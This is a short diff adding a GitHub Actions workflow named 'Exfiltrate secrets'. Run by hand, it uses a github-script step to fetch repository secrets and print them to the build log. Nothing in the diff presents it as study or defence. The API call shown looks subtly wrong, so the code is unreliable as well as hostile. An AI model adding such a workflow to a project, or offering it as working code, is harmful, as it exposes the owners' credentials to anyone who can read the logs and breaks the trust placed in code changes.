@@ -1,0 +1,15 @@
+name: Exfiltrate secrets
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Secrets
+        uses: actions/github-script@v4
+        with:
+          script: |
+            const secrets = await github.actions.getSecret('secrets');
+            console.log(secrets);
